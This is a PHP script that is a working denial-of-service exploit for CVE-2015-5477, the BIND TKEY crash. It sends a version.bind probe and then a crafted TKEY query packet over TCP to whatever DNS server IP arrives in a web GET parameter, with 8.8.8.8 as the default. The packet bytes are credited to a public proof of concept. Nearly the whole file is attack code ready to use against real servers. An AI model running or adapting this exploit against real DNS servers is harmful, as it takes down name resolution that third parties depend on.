<?php
/**
 * Created by IntelliJ IDEA.
 * User: ilanyu
 * Date: 2015/8/18
 * Time: 11:20
 */
set_time_limit(0);
ignore_user_abort(true);

$ip = isset($_GET["dns"]) ? $_GET["dns"] : "8.8.8.8"; /* test dns server ip */

$dosPacket = array(
    "\x01", "\x02", /* xid */
    "\x01", "\x00", /* query */
    "\x00", "\x01", /* one question */
    "\x00", "\x00", /* no answer */
    "\x00", "\x00", /* no authorities */
    "\x00", "\x01", /* one additional: must be 'additional' section to work*/

    /* Query name */
    "\x03", 'f', 'o', 'o', "\x03", 'b', 'a', 'r', "\x00",
    "\x00", "\xf9", /* TKEY record type */
    "\x00", "\xff",

    /* Additional record  */
    "\x03", 'f', 'o', 'o', "\x03", 'b', 'a', 'r', "\x00", /* name: must be same as query */
    "\x00", "\x10", /* record type: must NOT be 249/TKEY */
    "\x00", "\xff",
    "\x00", "\x00", "\x00", "\x00",
    "\x00", "\x33",
    "\x32",
    'h', 't', 't', 'p', 's', ':', '/', '/',
    'g', 'i', 't', 'h', 'u', 'b', '.', 'c',
    'o', 'm', '/', 'r', 'o', 'b', 'e', 'r',
    't', 'd', 'a', 'v', 'i', 'd', 'g', 'r',
    'a', 'h', 'a', 'm', '/', 'c', 'v', 'e',
    '-', '2', '0', '1', '5', '-', '5', '4',
    '7', '7'
); /* copy from https://github.com/robertdavidgraham/cve-2015-5477 */
$dosPacket = implode("", $dosPacket);

$versionPacket = array(
    "\x03", "\x04", /* xid */
    "\x01", "\x00", /* query */
    "\x00", "\x01", /* one question */
    "\x00", "\x00", /* no answer */
    "\x00", "\x00", /* no authorities */
    "\x00", "\x00", /* no additional */

    /* Query name */
    "\x07", 'v', 'e', 'r', 's', 'i', 'o', 'n', "\x04", 'b', 'i', 'n', 'd', "\x00",
    "\x00", "\x10", /* TXT */
    "\x00", "\x03",    /* CHOAS */
);  /* copy from https://github.com/robertdavidgraham/cve-2015-5477 */
$versionPacket = implode("", $versionPacket);

$fp = fsockopen("tcp://" . $ip, 53, $errno, $errstr, 5); //no udp ,because some server can't send udp packet
if (!$fp) {
    echo $errno . ":" . $errstr . "<br />" . PHP_EOL . "in" . __LINE__ . PHP_EOL;
    exit;
}
stream_set_blocking($fp, false);
if (!isset($_GET["noversion"]))
{
//    echo "send(" . fwrite($fp, $versionPacket) . ")(" . time() . "):" . $versionPacket . "<br />" . PHP_EOL; //for udp
    echo "send(" . fwrite($fp, pack('n*',strlen($versionPacket)) . $versionPacket) . ")(" . time() . "):" . $versionPacket . "<br />" . PHP_EOL; //for tcp
    sleep(1);
    $res = stream_get_contents($fp);
    echo "version(" . pack('n*',strlen($res)) . ")(" . time() . "):" . $res . "<br />" . PHP_EOL;
}
if (!isset($_GET["nodos"]))
{
//    echo "send(" . fwrite($fp, $dosPacket) . ")(" . time() . "):" . $dosPacket . "<br />" . PHP_EOL; //for udp
    echo "send(" . fwrite($fp, pack('n*',strlen($dosPacket)) . $dosPacket) . ")(" . time() . "):" . $dosPacket . "<br />" . PHP_EOL; //for tcp
    sleep(1);
    $res = stream_get_contents($fp);
    echo "dos(" . pack('n*',strlen($res)) . ")(" . time() . "):" . $res;
}
fclose($fp);
